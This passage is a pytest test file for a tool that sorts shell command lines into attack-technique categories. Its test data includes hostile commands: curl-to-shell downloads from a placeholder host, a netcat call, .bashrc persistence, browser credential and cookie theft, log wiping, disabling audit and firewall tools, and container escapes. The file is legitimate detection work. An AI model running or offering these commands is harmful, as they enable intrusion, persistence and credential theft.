"""Rules from the first real-data pass: the command position after a subshell, a brace group, a function header or a
case arm; context for shell bookkeeping that runs nothing; and rules for the command families seen most.

The examples are synthetic, modeled on the shapes of real lines. Attack-like lines are assembled from fragments at
runtime, so this file holds no literal attack strings.
"""

import itertools
import time

import pytest

from interlinear_cti.normalize import normalize_text
from interlinear_cti.rules import SCALE_LIMIT, SHAPES, load_library

CURL, WGET, BASH, SH = "cu" + "rl", "wg" + "et", "ba" + "sh", "s" + "h"
URL = "hxxp://203.0.113[.]5"
SHADOW = "/etc/" + "shadow"


@pytest.fixture(scope="module")
def library():
    return load_library()


def rule_of(library, text):
    rule = library.match(normalize_text(text))
    return rule.id if rule else None


def grammar_of(library, text):
    """The first rule whose regex reads text, before the gates that keep context to plainly literal records
    (rules.plainly_literal, Library.match): these tests pin the context grammar, which still reads every literal
    record behind the gates."""
    text = normalize_text(text)
    rule = next((rule for rule in library.rules if rule.regex.search(text)), None)
    return rule.id if rule else None


# 1. The command position skips a subshell, a brace group, a function header and a case-arm pattern.
@pytest.mark.parametrize("text, rule_id", [
    ("(cd /tmp/x && ls)", "navigation"),
    ("(whoami)", "whoami-id"),
    ("( whoami )", "whoami-id"),
    ("{ whoami; }", "whoami-id"),
    ("check() { whoami; }", "whoami-id"),
    ("check(){ whoami; }", "whoami-id"),
    ("function check { whoami; }", "whoami-id"),
    ("function check() { id; }", "whoami-id"),
    ("start) whoami ;;", "whoami-id"),
    ("*) uname -a ;;", "system-info"),
    ("-h|--help) cat /etc/passwd ;;", "account-list"),
    ('"stop") sudo systemctl stop auditd ;;', "audit-tamper"),
    ("(" + CURL + " -s " + URL + "/a -o /tmp/a)", "download-file"),
    ("start) crontab -e ;;", "cron"),
    ("deploy() { docker run -d --name web nginx; }", "container-deploy"),
    # Near misses: arithmetic and a command substitution are not prefixes.
    ("((n = n + 1))", None),
    ("x=$(whoami)", None),
])
def test_command_position_prefixes(library, text, rule_id):
    assert grammar_of(library, text) == rule_id


# 2. Context: shell bookkeeping that runs nothing an attack technique describes. A context rule claims a text only
# when every command in it is context, so it never hides a real command.
@pytest.mark.parametrize("text", [
    "fi", "done", "}", "then", "else", "esac", ";;", ")", "do", "{",
    "if [ -f /tmp/example ]; then", 'if [[ -z "$a" ]]; then', "while true; do", "for x in a b c; do",
    'case "$1" in', "until [ -f /tmp/done ]; do", 'elif [ "$a" = b ]; then', "if ! [ -d /opt/x ]; then",
    "if [ -f /tmp/example ]; then echo hello; fi",
    '[[ -z "$a" || -n "$b" ]] && { echo "missing" >&2; exit 1; }',
    "true", ":", "shift", "shift 2", "return 1", "continue", "break", "set -euo pipefail", "set -x",
    "read -r line", 'read -p "Continue? " ans', "check() {", "start)", "*) ;;",
])
def test_shell_syntax_is_context(library, text):
    assert grammar_of(library, text) == "shell-syntax"


@pytest.mark.parametrize("text, rule_id", [
    ("# example comment", "comment"),
    ("#!/bin/bash", "comment"),
    ("   # indented note", "comment"),
    ("ls -la # list the files", "navigation"),
    ("x=1", "assignment"),
    ('NAME="hello world"', "assignment"),
    ("local x", "assignment"),
    ("local count=0", "assignment"),
    ("export LANG=C", "assignment"),
    ("readonly MAX=5", "assignment"),
    ("declare -A seen", "assignment"),
    ('args=(\n  -H "X-Example: 1"\n  -H "X-Other: 2"\n)', "assignment"),
    ("echo hello", "print"),
    ('echo "done: $count"', "print"),
    ("printf '%s\\n' \"$*\"", "print"),
    ('echo "missing" >&2', "print"),
    ("echo hello > /dev/null", "print"),
    ('ok() { printf \'%s\\n\' "$*"; }', "print"),
    ('echo "line one\nline two"', "print"),
    ("sudo apt-get update", "package-install"),
    ("apt update && apt upgrade -y", "package-install"),
    ("DEBIAN_FRONTEND=noninteractive apt-get -y dist-upgrade", "package-install"),
    ("docker logs web", "container-status"),
    ("docker compose logs -f api", "container-status"),
    ("cd /tmp && ls", "navigation"),
    ("cd /tmp\nls", "navigation"),
    ("exit 1", "navigation"),
])
def test_context_kinds(library, text, rule_id):
    assert grammar_of(library, text) == rule_id


@pytest.mark.parametrize("text, rule_id", [
    # A header whose condition runs a command.
    ("while read line; do", None),
    ("if " + CURL + " -fsS " + URL + "/ok; then", None),
    ("for h in $(cat hosts); do", None),
    ('if [ "$(id -u)" = 0 ]; then', None),
    # Assignments that run a command or name a host, and the variables that change how commands run.
    ("out=$(id)", None),
    ("x=`id`", None),
    ("target=203.0.113.5", None),
    ("url=" + URL + "/a", None),
    ("host=evil.example.com", None),
    ("export PATH=/tmp/.x:$PATH", None),
    ("LD_PRELOAD=/tmp/x.so", None),
    ("export HISTFILE=/dev/null", "disable-history"),
    ("HISTSIZE=0", "disable-history"),
    ("set +o history", "disable-history"),
    ("history -c", "clear-history"),
    # echo and printf that write a file, pipe or substitute a command.
    ("echo $(whoami)", None),
    ("echo `id`", None),
    ("echo x > /tmp/y", None),
    ("echo hello | tr a-z A-Z", None),
    ("echo > /var/log/syslog", "log-wipe"),
    ("echo 'ssh-ed25519 AAAAC3Nza k' >> ~/.ssh/authorized_keys", "ssh-authorized-keys"),
    ("echo '" + CURL + " -s " + URL + "/x | " + SH + "' >> ~/.bashrc", "shell-rc-download"),
    # Navigation never hides the command after it.
    ("cd /tmp && " + CURL + " -s " + URL + "/x | " + SH, "download-pipe-shell"),
    ("cd /tmp; " + WGET + " " + URL + "/x", "download-file"),
    ("ls; cat " + SHADOW, None),
    ("ls -la > /etc/cron.d/x", "cron"),
    ("pwd | nc 203.0.113.5 4444", None),
    ("cd /tmp\nwhoami", None),
    ("cd /tmp && ./x", None),
    # Package removal and container changes are not context.
    ("apt-get remove -y auditd", None),
    ("docker stop web", "container-stop"),
    # A standalone truncation of a log is a log wipe.
    ("> /var/log/wtmp", "log-wipe"),
    (">/var/log/auth.log", "log-wipe"),
    (": > /var/log/syslog", "log-wipe"),
    ("true > /var/log/secure", "log-wipe"),
    ("> /tmp/example.log", None),
])
def test_context_never_hides_a_command(library, text, rule_id):
    assert rule_of(library, text) == rule_id


# 3. The command families seen most.
@pytest.mark.parametrize("text, rule_id", [
    ("docker run -d --name x alpine sleep 1000", "container-deploy"),
    ("docker run --rm -it -v /:/host alpine chroot /host", "container-escape"),
    ("sudo docker compose up -d", "container-deploy"),
    ("docker-compose up -d", "container-deploy"),
    ("docker exec -it web " + BASH, "container-exec"),
    ("docker build -t tool .", "container-build"),
    ("docker pull alpine:latest", "container-pull"),
    ("systemctl enable --now x.service", "systemd-service"),
    ("systemctl daemon-reload && systemctl enable x", "systemd-service"),
    ("sudo systemctl link /opt/x/x.service", "systemd-service"),
    ("systemctl start x", "service-start"),
    ("sudo systemctl restart nginx", "service-start"),
    ("systemctl stop auditd", "audit-tamper"),
    ("service auditd stop", "audit-tamper"),
    ("auditctl -e 0", "audit-tamper"),
    ("systemctl disable --now apparmor", "security-tool-stop"),
    ("systemctl stop falcon-sensor", "security-tool-stop"),
    ("setenforce 0", "security-tool-stop"),
    ("systemctl stop firewalld", "firewall-modify"),
    ("ufw disable", "firewall-modify"),
    ("sudo ufw allow 4444/tcp", "firewall-modify"),
    ("iptables -F", "firewall-modify"),
    ("iptables -I INPUT -p tcp --dport 4444 -j ACCEPT", "firewall-modify"),
    ("nft flush ruleset", "firewall-modify"),
    ("sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config", "sshd-config"),
    ("echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config", "sshd-config"),
    ("sed -i '$a @reboot /tmp/x' /etc/crontab", "cron"),
    ("sed -i 's/a/b/' ~/.bashrc", "shell-rc"),
    ("tar czf /tmp/d.tgz /var/www", "archive-collect"),
    ("tar -cvzf out.tar.gz /home/user", "archive-collect"),
    ("tar --create -f x.tar dir", "archive-collect"),
    ("zip -r /tmp/d.zip /var/www", "archive-collect"),
    ("7z a /tmp/d.7z /home", "archive-collect"),
    ("pm2 startup", "pm2-startup"),
    ("pm2 startup systemd -u app --hp /home/app", "pm2-startup"),
    ("pm2 save", "pm2-startup"),
    ("journalctl -u ssh --since today", "log-enumeration"),
    ("journalctl -xe", "log-enumeration"),
    ("tail -f /var/log/auth.log", "log-enumeration"),
    ("grep -i fail /var/log/auth.log", "log-enumeration"),
    ("zcat /var/log/auth.log.2.gz", "log-enumeration"),
    ("su -", "switch-user"),
    ("su - root", "switch-user"),
    ("sudo su -", "sudo-shell"),
    ("su postgres -c 'psql'", None),  # su -c runs its command: left to the model
    ("python3 -c 'import pty; pty.spawn(\"/bin/" + BASH + "\")'", "python-exec"),
    ('python -c "print(1)"', "python-exec"),
    ("python3 -u -c 'x'", "python-exec"),
    ("python3 - <<EOF", "python-exec"),
    ("python3 -c \"\nimport sys\nprint('hello')\n\"", "python-exec"),
    ("git clone https://github.com/example/tool.git", "git-clone"),
    ("git clone --depth 1 " + URL + "/tool.git /opt/tool", "git-clone"),
    ("sqlite3 ~/.config/google-chrome/Default/'Login Data' 'select origin_url from logins'", "browser-credentials"),
    ("cp ~/.mozilla/firefox/x.default/logins.json /tmp/", "browser-credentials"),
    ("sqlite3 ~/.config/chromium/Default/Cookies 'select * from cookies'", "browser-cookies"),
    ("sqlite3 ~/.mozilla/firefox/x.default/places.sqlite 'select url from moz_places'", "browser-history"),
    ("cd /tmp && " + WGET + " " + URL + "/x", "download-file"),
    (CURL + " -sL " + URL + "/t.tgz | tar xz -C /opt", "download-file"),
    (CURL + " -s " + URL + "/k | sudo tee /opt/k", "download-file"),
    (WGET + " -qO- " + URL + "/t.tgz | tar xz", "download-file"),
])
def test_command_families(library, text, rule_id):
    assert rule_of(library, text) == rule_id


@pytest.mark.parametrize("text", [
    "docker images", "docker stop web",
    "systemctl status x", "systemctl stop nginx", "ufw status", "iptables -L -n",
    "iptables -A INPUT -s 203.0.113.5 -j DROP",
    "sed -n '1p' /etc/ssh/sshd_config", "grep -i permit /etc/ssh/sshd_config", "sed -i 's/a/b/' notes.txt",
    "tar xzf x.tgz", "tar -tzf x.tgz", "unzip x.zip", "tar -C /opt -xzf x.tgz",
    "pm2 list", "pm2 logs",
    "sudo -i", "sum x",
    "python3 -m http.server 8000", "python3 x.py", "python3 --version",
    "git status", "git log --oneline",
    "sqlite3 app.db '.tables'",
])
def test_command_family_near_misses(library, text):
    assert rule_of(library, text) not in {
        "container-deploy", "container-exec", "container-build", "container-pull", "service-start", "audit-tamper",
        "security-tool-stop", "firewall-modify", "sshd-config", "archive-collect", "pm2-startup", "switch-user",
        "python-exec", "git-clone", "browser-credentials", "browser-cookies", "browser-history"}


@pytest.mark.parametrize("text, rule_id", [
    # Listing containers, images, networks or cluster resources is discovery (T1613), as ps is (T1057); a
    # container's logs stay context.
    ("docker ps", "container-discovery"),
    ("sudo docker ps -a", "container-discovery"),
    ("docker images", "container-discovery"),
    ("docker inspect web", "container-discovery"),
    ("docker network ls", "container-discovery"),
    ("docker container ls --all", "container-discovery"),
    ("docker -H tcp://10.0.0.5:2375 ps", "container-discovery"),
    ("kubectl get pods -A", "container-discovery"),
    ("kubectl -n prod describe pod web-1", "container-discovery"),
    ("cd /opt/app && docker compose ps", "container-discovery"),
    ("docker ps | grep web", "container-discovery"),
    ("docker logs web", "container-status"),
    ("docker run -d nginx", "container-deploy"),
    ("kubectl exec -it web-1 -- sh", "container-exec"),
    ("kubectl apply -f x.yaml", None),
    ("echo docker ps", "print"),
    ("ls /var/log", "navigation"),
    ("journalctl --vacuum-time=1s", "log-wipe"),
    ("cat /dev/null > /var/log/auth.log", "log-wipe"),
])
def test_family_neighbors(library, text, rule_id):
    assert rule_of(library, text) == rule_id


# The review of 2fdc770.

# C1: a comment has one reading. It runs to the end of its line, so it never ends early before trailing blanks or a
# ;; that a separator could take instead; with two readings per line, a failing text took exponential time.
COMMENTED = ["# step 1 \n", "#;;\n", "# ;;\n", "a) # x ;;\n", "x=1 # note \n", "# \n", "#   \n"]


@pytest.mark.parametrize("unit", COMMENTED)
def test_commented_lines_cost_linear_time(library, unit):
    for tail in ("whoami", " $(x)"):
        text = unit * 30 + tail
        start = time.perf_counter()
        library.match(text)
        assert time.perf_counter() - start < 0.5, (unit, tail)


def test_the_guard_times_commented_lines():
    assert {"# \n", "#;;\n", "x=1 # c \n"} <= set(SHAPES)


# The reviewer's tuple search: every pair of these tokens, repeated 6, 9 and 12 times with a failing tail, on every
# context rule. Linear growth from 9 to 12 repeats is about 1.33 times; a second reading per repeat doubles it each.
PAIR_TOKENS = ["#", "# ", ";;", ";", "\n", ")", "a)", "(", "{ ", "}", "a=1", "a=1 ", "echo", "echo ", " ", "then ",
               "do ", " && ", " || ", "'a'", '"a"', "\\", "x", "$a", "[ a ]", "[[ a ]]", "test ", "if ", "case a in",
               "esac", "f() {", "! ", "sudo -a ", ">&2", ">/dev/null", "a=(", "local ", ":", "true", "cd ", "ls ", "\t",
               "&", "|"]


def _best(search, text, reps):
    out = float("inf")
    for _ in range(reps):
        start = time.perf_counter()
        search(text)
        out = min(out, time.perf_counter() - start)
    return out


def test_no_pair_of_tokens_reads_two_ways(library):
    flagged = []
    for a, b in itertools.product(PAIR_TOKENS, repeat=2):
        unit = a + b
        for tail in (" $(x)", "\x00"):
            for rule in (r for r in library.rules if r.context):
                if _best(rule.regex.search, unit * 12 + tail, 1) < 0.001:
                    continue
                t9, t12 = (_best(rule.regex.search, unit * k + tail, 3) for k in (9, 12))
                if t12 > 0.002 and t12 > 3 * t9:
                    flagged.append((rule.id, unit, tail, round(t9 * 1000, 2), round(t12 * 1000, 2)))
    assert not flagged


# I1: apt that runs commands, reads a config file or installs a local package is not context. A hook option runs a
# shell command (T1059.004); the rest is left to the model.
DL = CURL + " -s " + URL + "/x | " + SH


@pytest.mark.parametrize("text, rule_id", [
    # The hook's value is itself a download piped into a shell, which the earlier, more specific rule names.
    ('apt-get update -o APT::Update::Pre-Invoke::="' + DL + '"', "download-pipe-shell"),
    ("sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/" + SH, "apt-hook-exec"),
    ('apt-get install -y -o Dpkg::Pre-Invoke::="/tmp/x" htop', "apt-hook-exec"),
    ("dpkg --pre-invoke=/tmp/x -i x.deb", "apt-hook-exec"),
    ("apt install -y ./x.deb", None),
    ("apt-get -c /tmp/apt.conf update", None),
    ("apt-get install -y nginx=1.18.0", None),
    ("apt-get install --option=Dpkg::Options::=--force-confnew x", None),
    ("apt-get install -y masscan tor proxychains4", None),  # named packages go to the model (the 411d3e1 review)
    ("sudo apt-get install -y libc6:i386", None),
    ("apt update", "package-install"),
])
def test_apt_that_runs_commands_is_not_context(library, text, rule_id):
    assert rule_of(library, text) == rule_id


# I2: credentials and code-loading variables are left to the model: an exported key is a signal.
@pytest.mark.parametrize("text", [
    "export AWS_SECRET_ACCESS_KEY=x", "export AWS_ACCESS_KEY_ID=x", "export OPENAI_API_KEY=x",
    "export GITHUB_TOKEN=x", "export ANTHROPIC_API_KEY=x", "export PGPASSWORD=x", "DB_PASSWORD=x", "api_key=x",
    "export HF_TOKEN=x", "export HUGGINGFACE_HUB_TOKEN=x", "export GOOGLE_APPLICATION_CREDENTIALS=x",
    "export AZURE_CLIENT_ID=x", "export GCP_PROJECT=x", "export GH_HOST=x", "SECRET=x", "my_cred=x", "AUTH_MODE=x",
    "export GCONV_PATH=/tmp/.x", "export JAVA_TOOL_OPTIONS=-javaagent:/tmp/x.jar", "export _JAVA_OPTIONS=-Xmx1g",
    "export NODE_PATH=/tmp/.x/node_modules", "export KUBECONFIG=/tmp/.x/kube.conf", "export DOCKER_CONFIG=/tmp/.x",
    "export -f ls", "declare -f x", "declare -n ref=x", "local -n ref=x",
])
def test_credential_and_loader_variables_are_not_context(library, text):
    assert rule_of(library, text) is None


# Over-claims. Status probes and listings are not downloads.
@pytest.mark.parametrize("text, rule_id", [
    (CURL + " -s -o /tmp/r -w '%{http_code}' " + URL + "/a", None),
    (CURL + " -sw '%{http_code}' " + URL + "/a", None),
    (CURL + " -I " + URL + "/a", None),
    (CURL + " --head " + URL + "/a", None),
    (CURL + " -s " + URL + "/a | tee /dev/null", None),
    (CURL + " -s " + URL + "/a | tee", None),
    (CURL + " -s " + URL + "/a | tar tz", None),
    (CURL + " -s " + URL + "/a | tar xz -C /opt", "download-file"),
    (CURL + " -s " + URL + "/a | sudo tee /opt/k", "download-file"),
    (CURL + " -sLO " + URL + "/a", "download-file"),
])
def test_status_probes_and_listings_are_not_downloads(library, text, rule_id):
    assert rule_of(library, text) == rule_id


# file-deletion removes intrusion traces: temporary and hidden paths, the script itself, payload names, and anything
# shred or wipe touches. Routine cleanup is left to the model.
@pytest.mark.parametrize("text, rule_id", [
    ("rm -f /tmp/x", "file-deletion"),
    ("rm -rf /dev/shm/.x", "file-deletion"),
    ("rm -rf /var/tmp/kinsing", "file-deletion"),
    ("rm -f ~/.x/run", "file-deletion"),
    ("rm -f $0", "file-deletion"),
    ('rm -f "$0"', "file-deletion"),
    ("rm -f ./xmrig", "file-deletion"),
    ("rm -f x.sh", "file-deletion"),
    ("shred -u notes.txt", "file-deletion"),
    ("wipe -f notes.txt", "file-deletion"),
    ("find /tmp -name '*.sh' -delete", "file-deletion"),
    ("rm -rf build dist", None),
    ("rm -f notes.txt", None),
    ("rm -rf node_modules", None),
    ("rm -r ./docs/old", None),
])
def test_file_deletion_is_trace_removal(library, text, rule_id):
    assert rule_of(library, text) == rule_id


# A case arm before a command is skipped and the command is read, also with blanks around | or quoted patterns.
@pytest.mark.parametrize("text, rule_id", [
    ("*x*|*y*) whoami", "whoami-id"),
    ("start | restart) whoami", "whoami-id"),
    ('"stop"|"halt") uname -a', "system-info"),
    ("'a b') whoami", "whoami-id"),
    ("*.tgz|*.tar.gz) tar czf /tmp/d.tgz /var/www", "archive-collect"),
    ("*x*|*y*) true", "shell-syntax"),
])
def test_a_case_arm_is_skipped_before_its_command(library, text, rule_id):
    assert grammar_of(library, text) == rule_id


# Minors: context breakers. A $( or a backtick anywhere, quoted or not, prompt expansion, printf -v, namerefs and
# descriptors above 2.
@pytest.mark.parametrize("text", [
    "x='$(id)'", "echo '`id`'", "echo ${x@P}", "printf -v x '%s' y", "printf -v 'a[x]' y", "declare -n ref=x",
    "read -u 3 line", 'echo "$secret" >&3', "echo x 3>&1", "[[ 'a[$(id)]' -eq 1 ]]", "read 'a[$(id)]'",
])
def test_context_breakers(library, text):
    rule = library.match(normalize_text(text))
    assert rule is None or not rule.context, rule.id


@pytest.mark.parametrize("text, rule_id", [
    ("read -u 0 line", "shell-syntax"),
    ('echo "missing" >&2', "print"),
    ("echo x 2>&1", "print"),
])
def test_low_descriptors_stay_context(library, text, rule_id):
    assert grammar_of(library, text) == rule_id


# Minors: better techniques and gaps.
@pytest.mark.parametrize("text, rule_id", [
    ("apt list --installed", "software-discovery"),
    ("apt-cache policy nginx", "software-discovery"),
    ("apt search nmap", "software-discovery"),
    ("apt show " + CURL, "software-discovery"),
    ("dpkg -l", "software-discovery"),
    ("dpkg -l | grep ssh", "software-discovery"),
    ("dpkg -s openssh-server", "software-discovery"),
    ("rpm -qa", "software-discovery"),
    ("rpm -qi openssh", "software-discovery"),
    ("dpkg -i x.deb", None),
    ("docker run --rm -it --privileged -v /:/host alpine chroot /host", "container-escape"),
    ("docker run -d --pid=host --privileged x", "container-escape"),
    ("docker run -v /:/mnt alpine chroot /mnt", "container-escape"),
    ("nsenter -t 1 -m -u -i -n -p -- " + SH, "container-escape"),
    ("nsenter --target 1 --mount " + SH, "container-escape"),
    ("docker run -d --privileged x", "container-deploy"),
    ("docker run -v /data:/data x", "container-deploy"),
    ("nsenter -t 4242 -n ip a", None),
    ("kubectl get secrets -A", "container-secrets"),
    ("kubectl -n prod get secret db -o yaml", "container-secrets"),
    ("kubectl describe secret db", "container-secrets"),
    ("kubectl get pods", "container-discovery"),
    ("sudo su", "sudo-shell"),
    ("sudo su -", "sudo-shell"),
    ("sudo -i", "sudo-shell"),
    ("sudo -s", "sudo-shell"),
    ("sudo -u root -i", "sudo-shell"),
    ("sudo -i whoami", "whoami-id"),
    ("su -", "switch-user"),
    ("sudo -l", None),
    ("docker stop web", "container-stop"),
    ("docker stop $(docker ps -q)", "container-stop"),
    ("docker kill web", "container-stop"),
    ("docker rm -f web", "container-stop"),
    ("docker compose down", "container-stop"),
    ("docker rm web", None),
    ("pkill auditd", "audit-tamper"),
    ("killall -9 auditd", "audit-tamper"),
    ("kill -9 $(pidof falcon-sensor)", "security-tool-stop"),
    ("pkill -f falcon-sensor", "security-tool-stop"),
    ("cp /srv/app/History /tmp/", None),
    ("sqlite3 ~/.config/google-chrome/Default/History 'select url from urls'", "browser-history"),
    ("zip -h", None),
    ("zip -r /tmp/d.zip /var/www", "archive-collect"),
])
def test_review_techniques_and_gaps(library, text, rule_id):
    assert rule_of(library, text) == rule_id


# The review of 411d3e1. Each bash behavior these rely on was checked in bash 5.2.37 with harmless markers.

BS = "\\"
SUB = "a" + BS + "[" + BS + "$" + BS + "(id" + BS + ")" + BS + "]"  # bash stores a[$(id)]; the text has no $(


def context_of(library, text):
    rule = library.match(normalize_text(text))
    return rule.id if rule is not None and rule.context else None


# M1: ${x@P} is caught by a literal @P}, so a line of unclosed ${ costs linear time, as the guard now checks.
def test_the_guard_times_unclosed_dollar_braces():
    assert "${" in SHAPES


@pytest.mark.parametrize("prefix, unit", [("", "${"), ("echo ", "${"), ("x=", "${"), ("# ", "${"), ("", "${ "),
                                          ("echo ", "${a "), ("", "\t${"), ("", "x${")])
def test_unclosed_dollar_braces_cost_linear_time(library, prefix, unit):
    small, large = ((prefix + unit * (n // len(unit) + 1))[:n] for n in (1050, 4200))
    for rule in (r for r in library.rules if r.context):
        for reps in (3, 9):  # a loaded machine can spoil one look; a real growth survives the second
            t_small, t_large = _best(rule.regex.search, small, reps), _best(rule.regex.search, large, reps)
            if t_large < 0.002 or t_large <= SCALE_LIMIT * t_small:
                break
        assert t_large < 0.002 or t_large <= SCALE_LIMIT * t_small, (rule.id, t_small, t_large)


# Prompt expansion runs what a value holds. bash also joins a line continuation inside double quotes, so ${x@\<newline>P}
# is ${x@P}: a backslash before a newline is never context, in or out of quotes.
@pytest.mark.parametrize("text", [
    "echo ${x@P}", 'echo "${arr[@]@P}"', "echo ${!x@P}", "x='$(id)'; echo ${x@P}",
    'echo "${x@' + BS + '\nP}"', 'echo "${x@P' + BS + '\n}"', 'echo "a' + BS + '\nb"', 'x="a' + BS + '\nb"',
])
def test_prompt_expansion_and_quoted_continuations_are_not_context(library, text):
    assert context_of(library, text) is None


def test_other_transformations_stay_context(library):
    assert grammar_of(library, "echo ${x@Q}") == "print"


# M2: arithmetic evaluates a name's value as an expression, so a subscript held in a variable runs: after
# x=a\[\$\(id\)\], [[ $x -eq 0 ]] runs id. So do -v in any test, $[ ], ${!x}, offsets, subscripts, for (( and -i.
@pytest.mark.parametrize("text", [
    "[[ $x -eq 0 ]]", "[[ x -ne 0 ]]", "[[ $x -lt 1 ]]", "[[ $x -le 1 ]]", "[[ $x -gt 1 ]]", "[[ $x -ge 1 ]]",
    "if [[ $x -gt 1 ]]; then", "while [[ $n -lt x ]]; do", "[[ -n $a && $x -eq 0 ]]", "[[ x -eq(0) ]]",
    "echo ${!x}", "echo ${!x[0]}", "echo ${y:x}", "echo ${y: -1}", "echo ${y:0:x}", "cd ${y:x}", "echo ${a[x]}",
    "echo ${#a[x]}", "echo ${a[@]:x}", "echo ${@:x}", "echo ${1:x}", "case $v in ${!x}) ;; esac",
    "for ((i = 0; i < x; i++)); do", "for ((;;)); do", "declare -i n", "local -i n", "typeset -i n=1",
    "declare -ai n", "declare -r -i n", "echo $[x]", "[[ -v $x ]]", '[ -v "$x" ]', 'test -v "$x"', '[ "-v" "$x" ]',
    "[ " + BS + '-v "$x" ]', "[[ -v a[x] ]]", "test -v",
])
def test_arithmetic_consumers_are_not_context(library, text):
    assert context_of(library, text) is None


def test_a_subscript_held_in_a_variable_reaches_the_model(library):
    assert grammar_of(library, "x=" + SUB) == "assignment"  # a literal value; its consumer is the signal
    assert context_of(library, "[[ $x -eq 0 ]]") is None


@pytest.mark.parametrize("text, rule_id", [
    ('[ "$x" -eq 0 ]', "shell-syntax"),  # [ and test read integers without evaluating them
    ('test "$a" -lt 2', "shell-syntax"),
    ("[[ -z $a ]]", "shell-syntax"),
    ("[[ $a == b ]]", "shell-syntax"),
    ("if [ -v a ]; then", "shell-syntax"),  # -v on a plain name evaluates nothing, however it is quoted
    ("[ " + BS + "-v x ]", "shell-syntax"),
    ("[[ -v HOME ]]", "shell-syntax"),
    ("echo ${x:-default}", "print"),
    ("echo ${#x}", "print"),
    ('echo "${args[@]}"', "print"),
    ('for k in "${!arr[@]}"; do', "shell-syntax"),
    ("echo ${!BASH*}", "print"),
    ("echo ${x#*/} ${x%.*} ${x/a/b}", "print"),
    ("declare -A seen", "assignment"),
    ("local -r x=1", "assignment"),
])
def test_expansions_that_evaluate_nothing_stay_context(library, text, rule_id):
    assert grammar_of(library, text) == rule_id


# M3: printf -v assigns, and printf reads its options after expansion, so a quoted, escaped, expanded or brace-built
# -v counts too. A first argument that starts with a dash or $, or holds a {, is not context.
@pytest.mark.parametrize("text", [
    "printf -vHISTFILE %s /dev/null", "printf -vPROMPT_COMMAND %s /tmp/.x/run", "printf -v x %s y",
    'printf "-vHX" %s y', "printf '-vHX' %s y", "printf " + BS + "-vHX %s y", 'printf ""-vHX %s y',
    "printf $o %s y", 'printf "$fmt" y', "printf ${o} %s y", "printf {,-vHX} %s y", "printf -- -vHX",
])
def test_printf_that_may_assign_is_not_context(library, text):
    assert context_of(library, text) is None


@pytest.mark.parametrize("text", [
    "printf '%s\\n' \"$*\"", 'printf "%s" "$x"', 'printf "Hello $name\\n"', "printf 'a b {,-vX}' y", "printf x",
])
def test_plain_printf_stays_context(library, text):
    assert grammar_of(library, text) == "print"


# I1: assignments that skip NAME=value. ${NAME:=v} and ${NAME=v} are never context; for and read names are checked
# as assignments are.
@pytest.mark.parametrize("text", [
    ": ${PROMPT_COMMAND:=/tmp/.x/run}", ": ${HISTIGNORE:=" + BS + "*}", "echo ${HISTIGNORE:='*'}",
    ": ${PS0:=" + SUB + "}", "[[ -n ${PROMPT_COMMAND=/tmp/.x/run} ]]", "echo ${x=1}", "cd ${HISTFILE:=/dev/null}",
    "for HISTFILE in /dev/null", "for HISTFILE in /dev/null; do true; done",
    "for PROMPT_COMMAND in /tmp/.x/run; do :; done", "read -r PROMPT_COMMAND", "read HISTFILE",
    "read -a PROMPT_COMMAND", "read -raPROMPT_COMMAND", "read -p x HISTFILE", "read -r $x", "read -r line HISTSIZE",
])
def test_assignments_outside_name_equals_value_are_checked(library, text):
    assert context_of(library, text) is None


@pytest.mark.parametrize("text", [
    "read -r line", 'read -p "Continue? " ans', "read -rp 'Name: ' name", "read -t 5 -n 1 reply", "read -u 0 line",
    "read -d '' -r -a parts", "read", "read -r a b c", "for x in a b c; do", "for i in 1 2 3",
])
def test_plain_reads_and_loops_stay_context(library, text):
    assert grammar_of(library, text) == "shell-syntax"


# I2: APT_CONFIG names another configuration, as apt -c does, and so can set a hook that runs a command.
@pytest.mark.parametrize("text", [
    "APT_CONFIG=/tmp/apt.conf apt-get update", "sudo APT_CONFIG=/tmp/apt.conf apt-get install -y htop",
    "export APT_CONFIG=/tmp/apt.conf", "APT_CONFIG=/tmp/apt.conf",
])
def test_an_apt_configuration_from_the_environment_is_not_context(library, text):
    assert rule_of(library, text) is None


# The agreed change: installing named packages goes to the model. apt upgrade with names installs them too.
@pytest.mark.parametrize("text, rule_id", [
    ("apt install -y nmap", None),
    ("sudo apt-get install -y nmap", None),
    ("DEBIAN_FRONTEND=noninteractive apt-get install -y git", None),
    ("apt upgrade nginx", None),
    ("apt-get dist-upgrade x", None),
    ("apt update", "package-install"),
    ("sudo apt-get update", "package-install"),
    ("apt update && apt upgrade -y", "package-install"),
    ("sudo apt-get -y dist-upgrade", "package-install"),
    ("apt-get -qq update", "package-install"),
])
def test_installing_named_packages_goes_to_the_model(library, text, rule_id):
    assert grammar_of(library, text) == rule_id


# I3 and a minor: sudo su runs a shell only with no command; su -c runs the command, which goes to the model.
@pytest.mark.parametrize("text, rule_id", [
    ("sudo su -c 'whoami'", None),
    ("sudo su - postgres -c 'psql -l'", None),
    ("sudo su root -c id", None),
    ("sudo su --command=id", None),
    ("sudo su", "sudo-shell"),
    ("sudo su -", "sudo-shell"),
    ("sudo su -l", "sudo-shell"),
    ("sudo su - deploy", "sudo-shell"),
    ("sudo su root", "sudo-shell"),
    ("sudo -iu deploy", "sudo-shell"),
    ("sudo -i -u deploy", "sudo-shell"),
    ("sudo -u deploy -i", "sudo-shell"),
    ("sudo -H -s", "sudo-shell"),
    ("sudo -i whoami", "whoami-id"),
    ("sudo -iu deploy whoami", "whoami-id"),
    ("sudo -s -- ls", None),
    ("sudo -l", None),
])
def test_sudo_opens_a_shell_only_without_a_command(library, text, rule_id):
    assert rule_of(library, text) == rule_id


# Minors: kubectl resource lists and options, reload signals, clustered apt options, python options with an argument.
@pytest.mark.parametrize("text, rule_id", [
    ("kubectl get secret,configmap -A", "container-secrets"),
    ("kubectl get configmap,secrets", "container-secrets"),
    ("kubectl get -o yaml secrets", "container-secrets"),
    ("kubectl get -n prod -o json secret/db", "container-secrets"),
    ("kubectl get secrets/db", "container-secrets"),
    ("kubectl get configmaps -A", "container-discovery"),
    ("kubectl get -o yaml pods", "container-discovery"),
    ("docker kill -s HUP web", None),
    ("docker kill --signal=SIGUSR1 web", None),
    ("docker kill -sHUP web", None),
    ("docker compose kill -s HUP", None),
    ("docker kill -s KILL web", "container-stop"),
    ("docker kill -s 9 web", "container-stop"),
    ("docker kill --signal SIGTERM web", "container-stop"),
    ("docker kill web", "container-stop"),
    ("docker compose kill", "container-stop"),
